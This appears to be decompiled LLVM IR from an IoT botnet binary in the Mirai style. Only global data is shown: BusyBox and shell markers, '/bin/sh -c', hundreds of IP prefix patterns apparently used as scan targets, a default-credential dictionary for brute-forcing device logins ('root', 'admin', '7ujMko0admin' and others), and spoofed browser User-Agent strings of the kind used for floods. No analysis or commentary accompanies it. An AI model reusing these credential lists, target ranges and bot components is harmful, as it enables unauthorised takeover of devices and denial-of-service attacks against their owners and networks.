source_filename = "test"
target datalayout = "E-p:32:32:32-f80:32:32"

%0 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }
%1 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }

@r1 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@r9 = internal unnamed_addr global i32 0
@r10 = internal unnamed_addr global i32 0
@r11 = internal unnamed_addr global i32 0
@r19 = internal unnamed_addr global i32 0
@r20 = internal unnamed_addr global i32 0
@r21 = internal unnamed_addr global i32 0
@r22 = internal unnamed_addr global i32 0
@r23 = internal unnamed_addr global i32 0
@r24 = internal unnamed_addr global i32 0
@r25 = internal unnamed_addr global i32 0
@r26 = internal unnamed_addr global i32 0
@r27 = internal unnamed_addr global i32 0
@r28 = internal unnamed_addr global i32 0
@r29 = internal unnamed_addr global i32 0
@r30 = internal unnamed_addr global i32 0
@r31 = internal unnamed_addr global i32 0
@cr0_so = internal unnamed_addr global i1 false
@cr4_eq = internal unnamed_addr global i1 false
@lr = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_10030000.1 = global i32 0
@global_var_1002b00c.3 = global i32 0
@global_var_1002b01c.4 = local_unnamed_addr global i32* @global_var_1002b00c.3
@global_var_1002b980.6 = global i32 0
@global_var_1002b998.7 = global i32 0
@global_var_1002b99c.8 = local_unnamed_addr global i32 0
@global_var_1002b9a0.9 = local_unnamed_addr global i32 0
@global_var_1002b570.10 = local_unnamed_addr global i32 4095
@global_var_1002b56c.11 = local_unnamed_addr global i32 362436
@global_var_10014928.12 = constant [8 x i8] c"BusyBox\00"
@global_var_10014924.14 = constant i32 587202560
@global_var_10014930.15 = constant [6 x i8] c"shell\00"
@global_var_10014938.16 = constant [7 x i8] c"dvrdvs\00"
@global_var_1002b0b8.17 = global [5 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10014928.12, i32 0, i32 0), i8* bitcast ([10 x i8*]* @global_var_10014920.13 to i8*), i8* bitcast (i32* @global_var_10014924.14 to i8*), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10014930.15, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10014938.16, i32 0, i32 0)]
@global_var_100148e0.18 = constant [7 x i8] c"nvalid\00"
@global_var_100148e8.19 = constant [6 x i8] c"ailed\00"
@global_var_100148f0.20 = constant [9 x i8] c"ncorrect\00"
@global_var_100148fc.21 = constant [6 x i8] c"enied\00"
@global_var_10014904.22 = constant [5 x i8] c"rror\00"
@global_var_1001490c.23 = constant [7 x i8] c"oodbye\00"
@global_var_10014914.24 = constant [4 x i8] c"bad\00"
@global_var_1002b098.25 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_100148e0.18, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100148e8.19, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_100148f0.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100148fc.21, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10014904.22, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1001490c.23, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10014914.24, i32 0, i32 0)]
@global_var_10017708.26 = constant [7 x i8] c"(null)\00"
@global_var_1002b918.27 = local_unnamed_addr global i32 0
@global_var_10001a34.28 = constant i32 1208002301
@global_var_10001a80.29 = constant i32 939589631
@global_var_10001ad4.30 = constant i32 1207959608
@global_var_10017710.31 = constant [8 x i8] c"/bin/sh\00"
@global_var_10017138.32 = constant [3 x i8] c"sh\00"
@global_var_10017718.33 = constant [3 x i8] c"-c\00"
@global_var_10001b34.34 = constant [3 x i8] c"8`\00"
@global_var_10001b64.35 = constant i32 1207959576
@global_var_1001771c.36 = constant i32 -1
@global_var_10017b1c.37 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_10017b2c.38 = constant [9 x i8] c"BOGOMIPS\00"
@global_var_1000235c.39 = constant i32 939524096
@global_var_100023a8.40 = constant i32 939524097
@global_var_1000259c.41 = constant i32 939524126
@global_var_1002b8f8.42 = local_unnamed_addr global i32 0
@global_var_10017b38.43 = constant [5 x i8] c"PING\00"
@global_var_10002698.44 = constant i32 939524126
@global_var_10017b40.45 = constant [14 x i8] c"gethostbyname\00"
@global_var_100028bc.46 = constant i32 939524097
@global_var_10002938.47 = constant i32 939524096
@global_var_100029cc.48 = constant i32 939524098
@global_var_10002bd4.49 = constant i32 939524097
@global_var_1002b900.50 = global i32 0
@global_var_1002b904.51 = local_unnamed_addr global i32 0
@global_var_1002b92c.52 = local_unnamed_addr global i32 0
@global_var_10002f4c.53 = constant i32 939524096
@global_var_10017b50.54 = constant [6 x i8] c":>%$#\00"
@global_var_1002b910.55 = global i32 0
@global_var_1002b911.56 = local_unnamed_addr global i32 0
@global_var_1002b912.57 = local_unnamed_addr global i32 0
@global_var_10017b58.60 = constant [11 x i8] c"1.10.%d.%d\00"
@global_var_10017b64.61 = constant [12 x i8] c"1.120.%d.%d\00"
@global_var_10017b70.62 = constant [12 x i8] c"5.140.%d.%d\00"
@global_var_10017b7c.63 = constant [12 x i8] c"5.141.%d.%d\00"
@global_var_10017b88.64 = constant [12 x i8] c"122.2.%d.%d\00"
@global_var_10017b94.65 = constant [12 x i8] c"122.3.%d.%d\00"
@global_var_10017ba0.66 = constant [13 x i8] c"122.53.%d.%d\00"
@global_var_10017bb0.67 = constant [13 x i8] c"122.54.%d.%d\00"
@global_var_10017bc0.68 = constant [13 x i8] c"188.16.%d.%d\00"
@global_var_10017bd0.69 = constant [13 x i8] c"188.17.%d.%d\00"
@global_var_10017be0.70 = constant [13 x i8] c"188.18.%d.%d\00"
@global_var_10017bf0.71 = constant [13 x i8] c"188.19.%d.%d\00"
@global_var_10017c00.72 = constant [13 x i8] c"31.162.%d.%d\00"
@global_var_10017c10.73 = constant [13 x i8] c"31.163.%d.%d\00"
@global_var_10017c20.74 = constant [12 x i8] c"5.142.%d.%d\00"
@global_var_10017c2c.75 = constant [12 x i8] c"5.143.%d.%d\00"
@global_var_10017c38.76 = constant [13 x i8] c"90.150.%d.%d\00"
@global_var_10017c48.77 = constant [13 x i8] c"90.151.%d.%d\00"
@global_var_10017c58.78 = constant [13 x i8] c"178.47.%d.%d\00"
@global_var_10017c68.79 = constant [12 x i8] c"94.50.%d.%d\00"
@global_var_10017c74.80 = constant [12 x i8] c"94.51.%d.%d\00"
@global_var_10017c80.81 = constant [13 x i8] c"190.43.%d.%d\00"
@global_var_10017c90.82 = constant [12 x i8] c"210.5.%d.%d\00"
@global_var_10017c9c.83 = constant [14 x i8] c"210.213.%d.%d\00"
@global_var_10017cac.84 = constant [11 x i8] c"27.0.%d.%d\00"
@global_var_10017cb8.85 = constant [11 x i8] c"27.8.%d.%d\00"
@global_var_10017cc4.86 = constant [12 x i8] c"27.50.%d.%d\00"
@global_var_10017cd0.87 = constant [12 x i8] c"27.54.%d.%d\00"
@global_var_10017cdc.88 = constant [12 x i8] c"27.98.%d.%d\00"
@global_var_10017ce8.89 = constant [13 x i8] c"27.112.%d.%d\00"
@global_var_10017cf8.90 = constant [13 x i8] c"27.192.%d.%d\00"
@global_var_10017d08.91 = constant [14 x i8] c"186.128.%d.%d\00"
@global_var_10017d18.92 = constant [14 x i8] c"186.132.%d.%d\00"
@global_var_10017d28.93 = constant [13 x i8] c"186.39.%d.%d\00"
@global_var_10017d38.94 = constant [13 x i8] c"186.56.%d.%d\00"
@global_var_10017d48.95 = constant [13 x i8] c"186.57.%d.%d\00"
@global_var_10017d58.96 = constant [13 x i8] c"186.58.%d.%d\00"
@global_var_10017d68.97 = constant [13 x i8] c"186.60.%d.%d\00"
@global_var_10017d78.98 = constant [13 x i8] c"46.181.%d.%d\00"
@global_var_10017d88.99 = constant [13 x i8] c"46.180.%d.%d\00"
@global_var_10017d98.100 = constant [14 x i8] c"188.173.%d.%d\00"
@global_var_10017da8.101 = constant [13 x i8] c"64.137.%d.%d\00"
@global_var_10017db8.102 = constant [13 x i8] c"103.20.%d.%d\00"
@global_var_10017dc8.103 = constant [13 x i8] c"103.47.%d.%d\00"
@global_var_10017dd8.104 = constant [13 x i8] c"103.57.%d.%d\00"
@global_var_10017de8.105 = constant [13 x i8] c"103.30.%d.%d\00"
@global_var_10017df8.106 = constant [13 x i8] c"103.54.%d.%d\00"
@global_var_10017e08.107 = constant [14 x i8] c"103.204.%d.%d\00"
@global_var_10017e18.108 = constant [13 x i8] c"103.44.%d.%d\00"
@global_var_10017e28.109 = constant [14 x i8] c"103.198.%d.%d\00"
@global_var_10017e38.110 = constant [14 x i8] c"103.203.%d.%d\00"
@global_var_10017e48.111 = constant [14 x i8] c"103.220.%d.%d\00"
@global_var_10017e58.112 = constant [14 x i8] c"103.242.%d.%d\00"
@global_var_10017e68.113 = constant [13 x i8] c"103.14.%d.%d\00"
@global_var_10017e78.114 = constant [14 x i8] c"103.195.%d.%d\00"
@global_var_10017e88.115 = constant [14 x i8] c"103.214.%d.%d\00"
@global_var_10017e98.116 = constant [14 x i8] c"103.218.%d.%d\00"
@global_var_10017ea8.117 = constant [14 x i8] c"103.225.%d.%d\00"
@global_var_10017eb8.118 = constant [14 x i8] c"103.228.%d.%d\00"
@global_var_10017ec8.119 = constant [14 x i8] c"103.231.%d.%d\00"
@global_var_10017ed8.120 = constant [13 x i8] c"103.60.%d.%d\00"
@global_var_10017ee8.121 = constant [14 x i8] c"103.248.%d.%d\00"
@global_var_10017ef8.122 = constant [14 x i8] c"103.253.%d.%d\00"
@global_var_10017f08.123 = constant [14 x i8] c"103.255.%d.%d\00"
@global_var_10017f18.124 = constant [13 x i8] c"103.35.%d.%d\00"
@global_var_10017f28.125 = constant [13 x i8] c"103.49.%d.%d\00"
@global_var_10017f38.126 = constant [13 x i8] c"103.62.%d.%d\00"
@global_var_10017f48.127 = constant [12 x i8] c"98.27.%d.%d\00"
@global_var_10017f54.128 = constant [13 x i8] c"98.179.%d.%d\00"
@global_var_10017f64.129 = constant [13 x i8] c"98.113.%d.%d\00"
@global_var_10017f74.130 = constant [13 x i8] c"98.121.%d.%d\00"
@global_var_10017f84.131 = constant [13 x i8] c"98.100.%d.%d\00"
@global_var_10017f94.132 = constant [13 x i8] c"98.161.%d.%d\00"
@global_var_10017fa4.133 = constant [13 x i8] c"98.165.%d.%d\00"
@global_var_10017fb4.134 = constant [12 x i8] c"112.5.%d.%d\00"
@global_var_10017fc0.135 = constant [14 x i8] c"117.165.%d.%d\00"
@global_var_10017fd0.136 = constant [11 x i8] c"85.3.%d.%d\00"
@global_var_10017fdc.137 = constant [13 x i8] c"37.158.%d.%d\00"
@global_var_10017fec.138 = constant [11 x i8] c"95.9.%d.%d\00"
@global_var_10017ff8.139 = constant [13 x i8] c"41.252.%d.%d\00"
@global_var_10018008.140 = constant [12 x i8] c"58.71.%d.%d\00"
@global_var_10018014.141 = constant [13 x i8] c"104.55.%d.%d\00"
@global_var_10018024.142 = constant [13 x i8] c"78.186.%d.%d\00"
@global_var_10018034.143 = constant [13 x i8] c"78.189.%d.%d\00"
@global_var_10018044.144 = constant [14 x i8] c"221.120.%d.%d\00"
@global_var_10018054.145 = constant [11 x i8] c"88.5.%d.%d\00"
@global_var_10018060.146 = constant [13 x i8] c"41.254.%d.%d\00"
@global_var_10018070.147 = constant [13 x i8] c"45.117.%d.%d\00"
@global_var_10018080.148 = constant [13 x i8] c"101.51.%d.%d\00"
@global_var_10018090.149 = constant [13 x i8] c"137.59.%d.%d\00"
@global_var_100180a0.150 = constant [11 x i8] c"1.56.%d.%d\00"
@global_var_100180ac.151 = constant [12 x i8] c"1.188.%d.%d\00"
@global_var_100180b8.152 = constant [13 x i8] c"14.204.%d.%d\00"
@global_var_100180c8.153 = constant [12 x i8] c"36.32.%d.%d\00"
@global_var_100180d4.154 = constant [13 x i8] c"36.248.%d.%d\00"
@global_var_100180e4.155 = constant [12 x i8] c"39.64.%d.%d\00"
@global_var_100180f0.156 = constant [11 x i8] c"42.4.%d.%d\00"
@global_var_100180fc.157 = constant [12 x i8] c"42.48.%d.%d\00"
@global_var_10018108.158 = constant [12 x i8] c"42.52.%d.%d\00"
@global_var_10018114.159 = constant [12 x i8] c"42.56.%d.%d\00"
@global_var_10018120.160 = constant [12 x i8] c"42.63.%d.%d\00"
@global_var_1001812c.161 = constant [12 x i8] c"42.84.%d.%d\00"
@global_var_10018138.162 = constant [13 x i8] c"42.176.%d.%d\00"
@global_var_10018148.163 = constant [13 x i8] c"42.224.%d.%d\00"
@global_var_10018158.164 = constant [13 x i8] c"43.253.%d.%d\00"
@global_var_10018168.165 = constant [13 x i8] c"43.230.%d.%d\00"
@global_var_10018178.166 = constant [13 x i8] c"163.53.%d.%d\00"
@global_var_10018188.167 = constant [13 x i8] c"62.252.%d.%d\00"
@global_var_10018198.168 = constant [13 x i8] c"43.245.%d.%d\00"
@global_var_100181a8.169 = constant [13 x i8] c"62.255.%d.%d\00"
@global_var_100181b8.170 = constant [12 x i8] c"77.96.%d.%d\00"
@global_var_100181c4.171 = constant [12 x i8] c"77.97.%d.%d\00"
@global_var_100181d0.172 = constant [12 x i8] c"77.98.%d.%d\00"
@global_var_100181dc.173 = constant [13 x i8] c"77.100.%d.%d\00"
@global_var_100181ec.174 = constant [13 x i8] c"77.102.%d.%d\00"
@global_var_100181fc.175 = constant [14 x i8] c"113.191.%d.%d\00"
@global_var_1001820c.176 = constant [13 x i8] c"81.100.%d.%d\00"
@global_var_1001821c.177 = constant [14 x i8] c"113.188.%d.%d\00"
@global_var_1001822c.178 = constant [14 x i8] c"113.189.%d.%d\00"
@global_var_1001823c.179 = constant [13 x i8] c"94.174.%d.%d\00"
@global_var_1001824c.180 = constant [13 x i8] c"14.160.%d.%d\00"
@global_var_1001825c.181 = constant [13 x i8] c"14.161.%d.%d\00"
@global_var_1001826c.182 = constant [13 x i8] c"14.162.%d.%d\00"
@global_var_1001827c.183 = constant [13 x i8] c"14.163.%d.%d\00"
@global_var_1001828c.184 = constant [13 x i8] c"14.164.%d.%d\00"
@global_var_1001829c.185 = constant [13 x i8] c"14.165.%d.%d\00"
@global_var_100182ac.186 = constant [13 x i8] c"14.166.%d.%d\00"
@global_var_100182bc.187 = constant [13 x i8] c"14.167.%d.%d\00"
@global_var_100182cc.188 = constant [13 x i8] c"14.168.%d.%d\00"
@global_var_100182dc.189 = constant [13 x i8] c"14.169.%d.%d\00"
@global_var_100182ec.190 = constant [13 x i8] c"14.170.%d.%d\00"
@global_var_100182fc.191 = constant [13 x i8] c"14.171.%d.%d\00"
@global_var_1001830c.192 = constant [13 x i8] c"14.172.%d.%d\00"
@global_var_1001831c.193 = constant [13 x i8] c"14.173.%d.%d\00"
@global_var_1001832c.194 = constant [13 x i8] c"14.174.%d.%d\00"
@global_var_1001833c.195 = constant [13 x i8] c"14.175.%d.%d\00"
@global_var_1001834c.196 = constant [13 x i8] c"14.176.%d.%d\00"
@global_var_1001835c.197 = constant [13 x i8] c"14.177.%d.%d\00"
@global_var_1001836c.198 = constant [13 x i8] c"14.178.%d.%d\00"
@global_var_1001837c.199 = constant [13 x i8] c"14.179.%d.%d\00"
@global_var_1001838c.200 = constant [13 x i8] c"14.180.%d.%d\00"
@global_var_1001839c.201 = constant [13 x i8] c"14.181.%d.%d\00"
@global_var_100183ac.202 = constant [13 x i8] c"14.182.%d.%d\00"
@global_var_100183bc.203 = constant [13 x i8] c"14.183.%d.%d\00"
@global_var_100183cc.204 = constant [13 x i8] c"14.184.%d.%d\00"
@global_var_100183dc.205 = constant [13 x i8] c"14.185.%d.%d\00"
@global_var_100183ec.206 = constant [13 x i8] c"14.186.%d.%d\00"
@global_var_100183fc.207 = constant [13 x i8] c"14.187.%d.%d\00"
@global_var_1001840c.208 = constant [13 x i8] c"14.188.%d.%d\00"
@global_var_1001841c.209 = constant [13 x i8] c"14.189.%d.%d\00"
@global_var_1001842c.210 = constant [13 x i8] c"14.190.%d.%d\00"
@global_var_1001843c.211 = constant [13 x i8] c"14.191.%d.%d\00"
@global_var_1001844c.212 = constant [13 x i8] c"45.121.%d.%d\00"
@global_var_1001845c.213 = constant [13 x i8] c"45.120.%d.%d\00"
@global_var_1001846c.214 = constant [13 x i8] c"45.115.%d.%d\00"
@global_var_1001847c.215 = constant [13 x i8] c"43.252.%d.%d\00"
@global_var_1001848c.216 = constant [13 x i8] c"43.240.%d.%d\00"
@global_var_1001849c.217 = constant [13 x i8] c"41.174.%d.%d\00"
@global_var_100184ac.218 = constant [13 x i8] c"49.118.%d.%d\00"
@global_var_100184bc.219 = constant [13 x i8] c"78.188.%d.%d\00"
@global_var_100184cc.220 = constant [13 x i8] c"45.127.%d.%d\00"
@global_var_100184dc.221 = constant [12 x i8] c"14.33.%d.%d\00"
@global_var_100184e8.222 = constant [13 x i8] c"123.16.%d.%d\00"
@global_var_100184f8.223 = constant [13 x i8] c"202.44.%d.%d\00"
@global_var_10018508.224 = constant [13 x i8] c"116.93.%d.%d\00"
@global_var_10018518.225 = constant [12 x i8] c"91.83.%d.%d\00"
@global_var_10018524.226 = constant [13 x i8] c"41.253.%d.%d\00"
@global_var_10018534.227 = constant [14 x i8] c"117.173.%d.%d\00"
@global_var_10018544.228 = constant [14 x i8] c"113.190.%d.%d\00"
@global_var_10018554.229 = constant [13 x i8] c"146.88.%d.%d\00"
@global_var_10018564.230 = constant [14 x i8] c"112.196.%d.%d\00"
@global_var_10018574.231 = constant [14 x i8] c"113.178.%d.%d\00"
@global_var_10018584.232 = constant [13 x i8] c"112.45.%d.%d\00"
@global_var_10018594.233 = constant [14 x i8] c"183.223.%d.%d\00"
@global_var_100185a4.234 = constant [13 x i8] c"116.71.%d.%d\00"
@global_var_100185b4.235 = constant [14 x i8] c"110.235.%d.%d\00"
@global_var_100185c4.236 = constant [14 x i8] c"124.253.%d.%d\00"
@global_var_100185d4.237 = constant [14 x i8] c"211.237.%d.%d\00"
@global_var_100185e4.238 = constant [14 x i8] c"117.175.%d.%d\00"
@global_var_100185f4.239 = constant [13 x i8] c"178.93.%d.%d\00"
@global_var_10018604.240 = constant [12 x i8] c"111.9.%d.%d\00"
@global_var_10018610.241 = constant [14 x i8] c"222.252.%d.%d\00"
@global_var_10018620.242 = constant [14 x i8] c"113.174.%d.%d\00"
@global_var_10018630.243 = constant [14 x i8] c"113.160.%d.%d\00"
@global_var_10018640.244 = constant [14 x i8] c"113.161.%d.%d\00"
@global_var_10018650.245 = constant [14 x i8] c"113.162.%d.%d\00"
@global_var_10018660.246 = constant [14 x i8] c"113.163.%d.%d\00"
@global_var_10018670.247 = constant [14 x i8] c"113.164.%d.%d\00"
@global_var_10018680.248 = constant [14 x i8] c"113.165.%d.%d\00"
@global_var_10018690.249 = constant [14 x i8] c"113.166.%d.%d\00"
@global_var_100186a0.250 = constant [14 x i8] c"116.167.%d.%d\00"
@global_var_100186b0.251 = constant [14 x i8] c"113.168.%d.%d\00"
@global_var_100186c0.252 = constant [13 x i8] c"113.17.%d.%d\00"
@global_var_100186d0.253 = constant [13 x i8] c"123.18.%d.%d\00"
@global_var_100186e0.254 = constant [13 x i8] c"123.19.%d.%d\00"
@global_var_100186f0.255 = constant [13 x i8] c"123.20.%d.%d\00"
@global_var_10018700.256 = constant [13 x i8] c"123.21.%d.%d\00"
@global_var_10018710.257 = constant [13 x i8] c"123.22.%d.%d\00"
@global_var_10018720.258 = constant [14 x i8] c"222.253.%d.%d\00"
@global_var_10018730.259 = constant [14 x i8] c"222.254.%d.%d\00"
@global_var_10018740.260 = constant [14 x i8] c"222.225.%d.%d\00"
@global_var_10018750.261 = constant [13 x i8] c"37.247.%d.%d\00"
@global_var_10018760.262 = constant [13 x i8] c"41.208.%d.%d\00"
@global_var_10018770.263 = constant [14 x i8] c"183.220.%d.%d\00"
@global_var_10018780.264 = constant [14 x i8] c"175.201.%d.%d\00"
@global_var_10018790.265 = constant [13 x i8] c"50.205.%d.%d\00"
@global_var_100187a0.266 = constant [13 x i8] c"88.248.%d.%d\00"
@global_var_100187b0.267 = constant [13 x i8] c"88.105.%d.%d\00"
@global_var_100187c0.268 = constant [13 x i8] c"88.247.%d.%d\00"
@global_var_100187d0.269 = constant [13 x i8] c"85.105.%d.%d\00"
@global_var_100187e0.270 = constant [12 x i8] c"188.3.%d.%d\00"
@global_var_100187ec.271 = constant [13 x i8] c"103.55.%d.%d\00"
@global_var_100187fc.272 = constant [14 x i8] c"103.233.%d.%d\00"
@global_var_1001880c.273 = constant [13 x i8] c"103.63.%d.%d\00"
@global_var_1001881c.274 = constant [13 x i8] c"144.48.%d.%d\00"
@global_var_1001882c.275 = constant [13 x i8] c"163.47.%d.%d\00"
@global_var_1001883c.276 = constant [13 x i8] c"223.29.%d.%d\00"
@global_var_1001884c.277 = constant [13 x i8] c"59.153.%d.%d\00"
@global_var_1001885c.278 = constant [14 x i8] c"113.176.%d.%d\00"
@global_var_1001886c.279 = constant [14 x i8] c"113.175.%d.%d\00"
@global_var_1001887c.280 = constant [14 x i8] c"113.177.%d.%d\00"
@global_var_1001888c.281 = constant [14 x i8] c"113.183.%d.%d\00"
@global_var_1001889c.282 = constant [14 x i8] c"202.164.%d.%d\00"
@global_var_100188ac.283 = constant [14 x i8] c"202.134.%d.%d\00"
@global_var_100188bc.284 = constant [13 x i8] c"210.56.%d.%d\00"
@global_var_100188cc.285 = constant [13 x i8] c"49.156.%d.%d\00"
@global_var_100188dc.286 = constant [14 x i8] c"203.210.%d.%d\00"
@global_var_100188ec.287 = constant [14 x i8] c"117.181.%d.%d\00"
@global_var_100188fc.288 = constant [14 x i8] c"117.177.%d.%d\00"
@global_var_1001890c.289 = constant [14 x i8] c"117.178.%d.%d\00"
@global_var_1001891c.290 = constant [14 x i8] c"117.176.%d.%d\00"
@global_var_1001892c.291 = constant [14 x i8] c"117.170.%d.%d\00"
@global_var_1001893c.292 = constant [14 x i8] c"117.171.%d.%d\00"
@global_var_1001894c.293 = constant [14 x i8] c"117.162.%d.%d\00"
@global_var_1001895c.294 = constant [13 x i8] c"112.26.%d.%d\00"
@global_var_1001896c.295 = constant [13 x i8] c"112.27.%d.%d\00"
@global_var_1001897c.296 = constant [13 x i8] c"112.28.%d.%d\00"
@global_var_1001898c.297 = constant [13 x i8] c"112.29.%d.%d\00"
@global_var_1001899c.298 = constant [13 x i8] c"112.30.%d.%d\00"
@global_var_100189ac.299 = constant [13 x i8] c"112.31.%d.%d\00"
@global_var_100189bc.300 = constant [14 x i8] c"203.150.%d.%d\00"
@global_var_100189cc.301 = constant [13 x i8] c"50.233.%d.%d\00"
@global_var_100189dc.302 = constant [13 x i8] c"27.255.%d.%d\00"
@global_var_100189ec.303 = constant [13 x i8] c"123.24.%d.%d\00"
@global_var_100189fc.304 = constant [13 x i8] c"123.25.%d.%d\00"
@global_var_10018a0c.305 = constant [13 x i8] c"111.26.%d.%d\00"
@global_var_10018a1c.306 = constant [13 x i8] c"111.20.%d.%d\00"
@global_var_1002b920.307 = local_unnamed_addr global i32 0
@global_var_10008b14.308 = constant i32 939524096
@global_var_10008b8c.309 = constant i32 939524098
@global_var_10008c48.310 = constant i32 939524096
@global_var_10018c58.311 = constant i32 -65220
@global_var_10014948.316 = constant [6 x i8] c"cisco\00"
@global_var_10014950.317 = constant [6 x i8] c"admin\00"
@global_var_10014958.318 = constant [5 x i8] c"root\00"
@global_var_10014960.319 = constant [5 x i8] c"user\00"
@global_var_10014968.320 = constant [8 x i8] c"support\00"
@global_var_10014974.321 = constant [7 x i8] c"telnet\00"
@global_var_1001497c.322 = constant [11 x i8] c"supervisor\00"
@global_var_10014988.323 = constant [7 x i8] c"daemon\00"
@global_var_10014990.324 = constant [5 x i8] c"1234\00"
@global_var_10014998.325 = constant [9 x i8] c"password\00"
@global_var_100149a4.326 = constant [11 x i8] c"1234567890\00"
@global_var_100149b0.327 = constant [4 x i8] c"vnp\00"
@global_var_100149b8.328 = constant [9 x i8] c"zyad1234\00"
@global_var_100149c4.329 = constant [13 x i8] c"7ujMko0admin\00"
@global_var_100149d4.330 = constant i32 0
@global_var_100149d8.331 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36\00"
@global_var_10014a4c.332 = constant [110 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\00"
@global_var_10014abc.333 = constant [114 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\00"
@global_var_10014b30.334 = constant [114 x i8] c"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\00"
@global_var_10014ba4.335 = constant [121 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/\00"
@global_var_10014c20.336 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\00"
@global_var_10014c90.337 = constant [121 x i8] c"Mozilla/5.0 (Linux; Android 5.1.1; LGLS751 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobi\00"
@global_var_10014d0c.338 = constant [114 x i8] c"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\00"
@global_var_10014d80.339 = constant [102 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\00"
@global_var_10014de8.340 = constant [121 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13G3\00"
@global_var_10014e64.341 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00"
@global_var_10014eb0.342 = constant [122 x i8] c"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 OPR/42.0.23'\00"
@global_var_10014f2c.343 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2683.0 Safari/537.36\00"
@global_var_10014f9c.344 = constant [114 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36\00"
@global_var_10015010.345 = constant [46 x i8] c"Mozilla/4.0 (compatible; MSIE 999.1; Unknown)\00"
@global_var_10015040.346 = constant [121 x i8] c"Mozilla/5.0 (Linux; Android 5.1.1; LG-K330 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobi\00"
@global_var_100150bc.347 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2672.0 Safari/537.36\00"
@global_var_1001512c.348 = constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00"
@global_var_10015174.349 = constant [121 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 10_2 like Mac OS X) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0 Mobile/14C9\00"
@global_var_100151f0.350 = constant [121 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0 Mobile/14\00"
@global_var_1001526c.351 = constant [121 x i8] c"Mozilla/5.0 (Linux; Android 4.4.2; LGLS740 Build/KOT49I.LS740ZV6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.288\00"
@global_var_100152e8.352 = constant [74 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0\00"
@global_var_10015334.353 = constant [105 x i8] c"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Safari/537.36\00"
@global_var_100153a0.354 = constant [77 x i8] c"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0\00"
@global_var_100153f0.355 = constant [121 x i8] c"Mozilla/5.0 (Linux; Android 4.4.4; HUAWEI H892L Build/HuaweiH892L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.28\00"
@global_var_1001546c.356 = constant [121 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/1\00"
@global_var_100154e8.357 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0\00"
